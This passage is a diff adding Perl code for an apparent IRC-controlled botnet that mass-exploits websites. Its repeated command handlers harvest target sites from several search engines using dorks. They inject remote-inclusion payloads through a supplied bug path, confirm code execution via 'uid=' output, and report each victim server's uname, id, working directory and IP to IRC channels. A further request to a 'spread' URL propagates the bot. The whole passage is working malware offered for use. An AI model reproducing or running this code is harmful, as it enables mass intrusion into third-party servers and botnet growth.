+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N JP3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+	if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #katatudo
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @katalist = katatudo($dork);
+                push( my @tot, @katalist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3K3a6t7u3d7o 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3K3a6t7u3d7o 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3K3a6t7u3d7o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3K3a6t7u3d7o3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3K3a6t7u3d7o3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3K3a6t7u3d7o3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3K3a6t7u3d7o3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+	if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #live
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @livelist = live($dork);
+                push( my @tot, @live );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3L3i6v7e 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3L3i6v7e 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3L3i6v7e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3L3i6v7e3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3L3i6v7e3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3L3i6v7e3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3L3i6v7e3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #sitedebusca
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @sitelist = sitedebusca($dork);
+                push( my @tot, @sitelist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3S3i6t7e3De7Bus12ca 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3S3i6t7e3De7Bus12ca 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3S3i6t7e3De7Bus12ca3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3S3i6t7e3De7Bus12ca3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3S3i6t7e3De7Bus12ca3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3S3i6t7e3De7Bus12ca3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3S3i6t7e3De7Bus12ca3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #achando
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @achalist = achando($dork);
+                push( my @tot, @achalist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3A3c6h7a3n7d12o 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3A3c6h7a3n7d12o 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3A3c6h7a3n7d12o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3A3c6h7a3n7d12o3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3A3c6h7a3n7d12o3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3c6h7a3n7d12o3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3A3c6h7a3n7d12o3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #aonde
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @aonlist = aonde($dork);
+                push( my @tot, @aonlist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3A3o6n7d3e 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");               my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3A3o6n7d3e 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3A3o6n7d3e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3A3o6n7d3e3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3A3o6n7d3e3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3o6n7d3e3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3A3o6n7d3e3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #jekoo
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @jeklist = aonde($dork);
+                push( my @tot, @jeklist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3J3e6k7o3o 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3J3e6k7o3o 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3J3e6k7o3o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3J3e6k7o3o3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3J3e6k7o3o3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3J3e6k7o3o3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3J3e6k7o3o3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #gigablast
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @gigalist = gigablast($dork);
+                push( my @tot, @gigalist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3G3i6g7a3B7la12st 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3G3i6g7a3B7la12st 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3G3i6g7a3B7la12st3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3G3i6g7a3B7la12st3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3G3i6g7a3B7la12st3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3G3i6g7a3B7la12st3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3G3i6g7a3B7la12st3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #alice
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @alicelist = gigablast($dork);
+                push( my @tot, @alicelist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3A3l6i7c3e 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3A3l6i7c3e 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3A3l6i7c3e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Server Ip: $ip1");
